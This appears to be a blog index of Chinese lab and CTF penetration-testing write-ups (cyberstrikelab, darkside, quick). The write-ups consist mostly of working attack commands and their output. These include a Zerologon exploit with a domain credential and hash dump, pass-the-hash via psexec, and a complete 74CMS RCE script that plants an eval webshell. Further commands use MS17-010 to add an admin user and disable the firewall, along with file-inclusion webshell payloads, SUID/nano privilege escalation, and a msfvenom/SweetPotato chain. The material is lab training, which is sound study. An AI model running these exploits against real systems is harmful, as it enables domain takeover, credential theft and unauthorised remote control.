提示：听说有小黑已经渗透过了，木马留在主页 一句话木马密码爆破(base) awBruter [master] python2 awBruter.py -u http://192.168.20.20:8055/index.php ________ ___________ ___ ____ __ )__________ ___ /______________ __ `/_ | /| / /_ __ |_ ___/ / / / __/ _ \\_ ___// /_/ /__ |/ |/ /_ /_/ /_ / / /_/ // /_ / __/ /\\__,_/ ____/|__/ /_____/ /_/ \\__,_/ \\__/ \\___//_/ By LSATotal password nums is 23765Cut 23 groupsstyle type=text/css* padding: 0; margin: 0; .think_default_text padding: 4px 48px; acolor:#2E5CD5;cursor: pointer;text-decoration: none a:hovertext-decoration:underline; body background: #fff; font-family: Century Gothic,Microsoft yahei; color: #333;font-size:18px h1 font-size: 100px; font-weight: normal; margin-bottom: 12px; p line-height: 1.6em; font-size: 42px /stylediv style=padding: 24px 48px; h1:)/h1p ThinkPHP V5br/span style=font-size:30px十年磨一剑 - 为API开发设计的高性能框架/span/pspan style=font-size:22px;[ V5.0 版本由 a href=http://www.qiniu.com target=qiniu七牛云/a 独家赞助发布 ]/span/divscript type=text/javascript src=https://tajs.qq.com/stats?sId=9347272 charset=UTF-8/scriptscript type=text/javascript src=https://e.topthink.com/Public/static/client.js/scriptthink id=ad_bd568ce7058a1091/thinkPassword is admin123!!!!!!!!!!!!! 密码是admin123 域控为192.168.20.30 CVE-2020-1472使用工具https://github.com/dirkjanm/CVE-2020-1472 将域密码置空 (base) CVE-2020-1472 [master] python3 cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30Found existing alias for python3. You should use: pPerforming authentication attempts...========================================================================================================================================================================================================================================================Target vulnerable, changing account password to empty stringResult: 0Exploit complete! (base) examples [master●] python3 secretsdump.py cyberstrikelab.com/WIN-7NRTJO59O7N\\$@192.168.20.30 -no-pass -just-dcFound existing alias for python3. You should use: p/opt/anaconda3/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:f349636281150c001081894de72b4e2b:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::cyberstrikelab.com\\cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:f204ab1085c283f6ec7eae4810c7489b:::WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:b58b954756a657857a4746529b6c970f:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:c4a86116c98ca4f216dd7e4b92bd7067d1125d59901e3463b9f4bb10cc822b25Administrator:aes128-cts-hmac-sha1-96:3d9a6eb42fe6a536856089314eafb249Administrator:des-cbc-md5:fedf5d49a4b9e94aAdministrator:rc4_hmac:f349636281150c001081894de72b4e2bkrbtgt:aes256-cts-hmac-sha1-96:81eac4fb1383dcbc80cb124aa6074c889f22c4801c0a7825bf8195f77c5cf725krbtgt:aes128-cts-hmac-sha1-96:65195790b2a7748a2bab4d9fd0e4ef89krbtgt:des-cbc-md5:196bd04fa28c8531krbtgt:rc4_hmac:5bc02b7670084dd30471730cc0a1672ccyberstrikelab.com\\cyberweb:aes256-cts-hmac-sha1-96:f227b833b5e56339183eafb4515109e6c8973f7f8cfa349890aa0561dbca5abacyberstrikelab.com\\cyberweb:aes128-cts-hmac-sha1-96:a83d6c82d012d151bd755d444a3d7492cyberstrikelab.com\\cyberweb:des-cbc-md5:a1f762523e7680f4cyberstrikelab.com\\cyberweb:rc4_hmac:f204ab1085c283f6ec7eae4810c7489bWIN-7NRTJO59O7N$:aes256-cts-hmac-sha1-96:4715be0a05fa5448f368d1542b1a3117301d9b69ef8044a76256dbfcdce33e93WIN-7NRTJO59O7N$:aes128-cts-hmac-sha1-96:518e862b4f821ec9894373f2df4bb8b4WIN-7NRTJO59O7N$:des-cbc-md5:9291ce2a765d6270WIN-7NRTJO59O7N$:rc4_hmac:31d6cfe0d16ae931b73c59d7e0c089c0CYBERWEB$:aes256-cts-hmac-sha1-96:82084ffa1eb1a4aaa65027f77b4f09990c70c30901536680e72e994d9549dacaCYBERWEB$:aes128-cts-hmac-sha1-96:04e1286477fcd1c27528ad626f33ad1cCYBERWEB$:des-cbc-md5:15a1f7f857b92086CYBERWEB$:rc4_hmac:b58b954756a657857a4746529b6c970f[*] Cleaning up... (base) examples [master●] python3 psexec.py -hashes :f349636281150c001081894de72b4e2b cyberstrikelab.com/Administrator@192.168.20.30Found existing alias for python3. You should use: p/opt/anaconda3/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 192.168.20.30.....[*] Found writable share ADMIN$[*] Uploading file UuQkKSZf.exe[*] Opening SVCManager on 192.168.20.30.....[*] Creating service cmIc on 192.168.20.30.....[*] Starting service cmIc.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [�汾 6.1.7600][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\\Windows\\system32","tags":["taocms默认口令getshell","一句话木马密码爆破","CVE-2020-1472"]},{"title":"cyberstrikelab lab2","path":"/2025/07/14/lab2/","content":"lab2信息收集(base) Downloads fscan -h 192.168.10.0/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscantrying RunIcmp2The current user permissions unable to send icmp packets192.168.10.233:22 open192.168.10.20:135 open192.168.10.10:135 open192.168.10.10:139 open192.168.10.20:139 open192.168.10.20:445 open192.168.10.10:445 open192.168.10.10:3306 open192.168.10.20:8080 open192.168.10.233:8080 open192.168.10.10:808 open192.168.10.10:7680 open192.168.10.20:8009 open[*] alive ports len is: 13start vulscan已完成 0/13 [-] Ms17010 192.168.10.10 read tcp 172.16.233.2:61586-192.168.10.10:445: read: connection reset by peer[*] NetInfo[*]192.168.10.10 [-]DESKTOP-JFB57A8 [-]192.168.10.10[*] WebTitle https://192.168.10.233:8080 code:404 len:19 title:None[*] WebTitle http://192.168.10.20:8080 code:200 len:11432 title:Apache Tomcat/8.5.19[*] NetBios 192.168.10.20 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell[*] WebTitle http://192.168.10.10:808 code:200 len:20287 title:骑士PHP高端人才系统(www.74cms.com)[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce 在192.168.10.10:808发现骑士CMS，使用脚本 骑士CMS-RCE#Author：ylwsimport sysimport requestsimport datetimedef exploit(url): try: target = url + /index.php?m=homea=assign_resume_tpl header = User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/ exp1 = variable:1,tpl:?php fputs(fopen(ylws.php,w),?php eval(\\$_POST[ylws]);?)?; ob_flush();?/r/nqscms/company_show 列表名=info 企业id=$_GET[\\id\\]/ res = requests.post(url=target,data=exp1) if res.text.find(WE CAN DO IT JUST THINK) 0: current_time = str(datetime.date.today()); temp = current_time[2:] dispose_time = temp.replace(-,_) exp2 = variable:1,tpl:data/Runtime/Logs/Home/ + dispose_time +.log include_res = requests.post(url=target,headers=header,data=exp2,timeout=5) if include_res.status_code == 200: wsurl = url + /ylws.php wstext = ylws:echo 1 wsres = requests.post(url=wsurl,headers=header,data=wstext,timeout=5) print(wsres.text) if wsres.text.find(1): return [+]Shell_url:+ wsurl + + Password: + ylws else: return 1 except Exception as e: return 2if __name__ == __main__: if len(sys.argv) = 2: url = sys.argv[1] res = exploit(url) if res != 2 and res != 1: print(res) elif res == 1: print([-]目标不存在漏洞!) elif res == 2: print([-]网络异常,检测与目标主机通信!) else: print(python 74CMS_shell.py Target Url) (base) 74CMS_骑士CMS python3 poc.py http://192.168.10.10:808/Found existing alias for python3. You should use: p/Users/gongtaiyun/Desktop/secs/tools/frame_exp/74CMS_骑士CMS/poc.py:10: SyntaxWarning: invalid escape sequence \\$ exp1 = variable:1,tpl:?php fputs(fopen(ylws.php,w),?php eval(\\$_POST[ylws]);?)?; ob_flush();?/r/nqscms/company_show 列表名=info 企业id=$_GET[\\id\\]/br /bParse error/b: syntax error, unexpected end of file, expecting , or ; in bC:\\phpstudy_pro\\WWW\\ylws.php(1) : eval()d code/b on line b1/bbr /[+]Shell_url:http://192.168.10.10:808//ylws.php Password:ylws cve-2017-12615 上传发现是双网卡机器 C:\\Users\\Public fscan.exe -h 192.168.20.0/24___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan(icmp) Target 192.168.20.20 is alive(icmp) Target 192.168.20.30 is alive[*] Icmp alive hosts len is: 2192.168.20.20:445 open192.168.20.30:88 open192.168.20.20:8080 open192.168.20.30:445 open192.168.20.30:139 open192.168.20.20:139 open192.168.20.30:135 open192.168.20.20:135 open192.168.20.20:8009 open[*] alive ports len is: 9start vulscan[*] NetBios 192.168.20.20 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[+] MS17-010 192.168.20.30\t(Windows Server 2008 R2 Standard 7600)[*] NetInfo [*]192.168.20.30 [-]WIN-7NRTJO59O7N [-]192.168.20.30[*] WebTitle http://192.168.20.20:8080 code:200 len:11432 title:Apache Tomcat/8.5.19[+] PocScan http://192.168.20.20:8080 poc-yaml-iis-put-getshell [+] PocScan http://192.168.20.20:8080 poc-yaml-tomcat-cve-2017-12615-rce 已完成 9/9[*] 扫描结束,耗时: 8.3856731s ms17-010用这两个失败了 use exploit/windows/smb/ms17_010_eternalblueuse exploit/windows/smb/ms17_010_psexec 直接使用命令远程连接 use auxiliary/admin/smb/ms17_010_commandset COMMAND REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fset RHOSTS 192.168.20.20set COMMAND net user cc Admin@123 /addset COMMAND net localgroup Administrators cc /addset COMMAND netsh firewall set opmode disable 远程连接即可","tags":["ms17-010","骑士CMS-RCE","CVE-2017-12615"]},{"title":"darkside","path":"/2025/07/07/darkside/","content":"darkside 靶机ip: 192.168.1.97 攻击机ip: 192.168.1.93 信息收集(base) Downloads nmap -sC -sV -p- 192.168.1.97Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 18:05 CSTNmap scan report for 192.168.1.97Host is up (0.0050s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)| ssh-hostkey:| 3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)| 256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)|_ 256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)80/tcp open http Apache httpd 2.4.56 ((Debian))|_http-title: The DarkSide| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.56 (Debian)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds (pwncat) ➜ Downloads feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,md -u http://192.168.1.97 -C 404 -d 1 ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben epi Risher 🤓 ver: 2.11.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.1.97 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 💢 Status Code Filters │ [404] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.11.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [php, html, txt, bak, md] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────404 GET 9l 31w 274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter403 GET 9l 28w 277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200 GET 29l 45w 683c http://192.168.1.97/index.php200 GET 74l 300w 2121c http://192.168.1.97/styles.css200 GET 29l 45w 683c http://192.168.1.97/301 GET 9l 28w 313c http://192.168.1.97/backup = http://192.168.1.97/backup/ (base) Downloads curl http://192.168.1.97/backup/vote.txtrijaba: Yesxerosec: Yessml: Nocromiphi: Nogatogamer: Nochema: Yestalleyrand: Nod3b0o: YesSince the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin. (base) Downloads curl http://192.168.1.97/backup/vote.txt vote.txt % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 205 100 205 0 0 4191 0 --:--:-- --:--:-- --:--:-- 4270(base) Downloads cat vote.txt | awk -F : print $1 | grep -Ev ^$ | grep -Ev Since* user.txt(base) Downloads echo kevin user.txt 后台密码爆破这里跑的太慢了，最后看wp找密码 kevin/iloveyou 解密出来是 sfqekmgncutjhbypvxda.onion 修改Cookie 最终获得 kevin:ILoveCalisthenics kevin@darkside:~$ ls -altotal 32drwxr-xr-x 3 kevin kevin 4096 Oct 30 2023 .drwxr-xr-x 4 root root 4096 Oct 15 2023 ..lrwxrwxrwx 1 kevin kevin 9 Oct 30 2023 .bash_history - /dev/null-rw-r--r-- 1 kevin kevin 220 Oct 15 2023 .bash_logout-rw-r--r-- 1 kevin kevin 3526 Oct 15 2023 .bashrc-rw-r--r-- 1 kevin kevin 113 Oct 15 2023 .historydrwxr-xr-x 3 kevin kevin 4096 Oct 15 2023 .local-rw-r--r-- 1 kevin kevin 807 Oct 15 2023 .profile-rw-r--r-- 1 kevin kevin 19 Oct 15 2023 user.txtkevin@darkside:~$ cat .historyls -alhostname -Iecho Congratulations on the OSCP Xerosectopps -fauxsu rijabaILoveJabitals /home/rijabakevin@darkside:~$ su - rijabaPassword:rijaba@darkside:~$ nano提权rijaba@darkside:~$ sudo -lMatching Defaults entries for rijaba on darkside: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser rijaba may run the following commands on darkside: (root) NOPASSWD: /usr/bin/nanorijaba@darkside:~$ nano^R^Xreset; bash 10 20","tags":["后台密码爆破","nano提权"]},{"title":"quick","path":"/2025/06/11/quick/","content":"使用fscan扫描发现开启了80端口，访问页面 点击下面的Home、Cars等会出现参数?page=xxxx，猜测有文件包含，但是使用php伪协议没有包含成功，尝试远程包含，本机开启服务器 echo test 1.phppython -m http.server 8089 发现成功访问了我的http服务器上的1.php 漏洞利用data:伪协议可以直接传数据，不用包含远程服务器上的文件 ?php system($_POST[1]);? =data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4= 远程文件包含法在攻击机启动一个http服务器 python -m http.server 8089 服务器上写一个shell.php ?phpsystem($_POST[1]);? 因为这里代码应该是$filename . .php的类型，要过滤后面的.php可以在后面使用?和# 使用配置 php提权尝试suid提权 find / -perm -4000 -type f 2/dev/null 发现php7.0具有suid权限,但是在蚁剑终端里面不能提权，反弹shell出来 然后使用命令 cd /usr/binCMD=/bin/sh./php7.0 -r pcntl_exec(/bin/sh, [-p]);","tags":["data伪协议","远程文件包含","php提权"]},{"title":"cyberstrikelab pt-1","path":"/2025/03/18/cyberstrikelab-pt-1/","content":"信息收集首先扫描发现开放80端口 然后访问页面 海洋CMS V12.9后台RCE 发现海洋CMS，dirsearch没扫描到后台信息，海洋CMS默认后台是http://x.x.x.x/6位随机字符及数字，后面尝试发现是cslab，管理员账号密码也是cslab 登录即可发现当前版本为12.9，这个版本直接使用后台RCE 首先找到上传位置。用户 - 会员消息通知 - 通知1,2,3(任选)填入;@eval($_POST[1]); POST /fwmblp/admin_notify.php?action=set HTTP/1.1Host: demo.comContent-Length: 68Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://demo.comContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://demo.com/fwmblp/admin_notify.phpAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: deviceid=1722062988348; xinhu_ca_rempass=0; xinhu_mo_adminid=yy0nm0mjj0mjn0vy0mmj0vk0mmn0mjm0iq0mjz0mjz0iv0vi0iu0nv07; xinhu_ca_adminuser=rock; WS_ADMIN_URL=ws://demo.com/notice; WS_CHAT_URL=ws://demo.com/msg; PHPSESSID=cht2r7hck3t75nu2t0k8ln3his; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3DConnection: keep-alivenotify1=%22%3B%40eval%28%24_POST%5B1%5D%29%3B%22notify2=1notify3=1 访问一句话保存的文件并对其利用,访问http://x.x.x.x/data/admin/notify.php 在C盘根目录即可读取到第一个flag windows提权C:\\WWW\\data\\admin whoamint authority\\local service 发现权限较低，查找提权方法 发现启用SeImpersonatePrivilege，使用SweetPotato提权 SweetPotato.exe -a whoami 发现能正常提权，执行个msf木马上线抓 msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=7777 -f exe cc.exe msf命令行 use exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset lhost 172.16.233.2set rhost 10.0.0.68set lport 7777 然后运行cc.exe SweetPotato.exe -a C:\\WWW\\data\\admin\\cc.exe 然后使用 load kiwicreds_all 获得NTLM，直接提交即可","tags":["海洋cms","seacms"]}]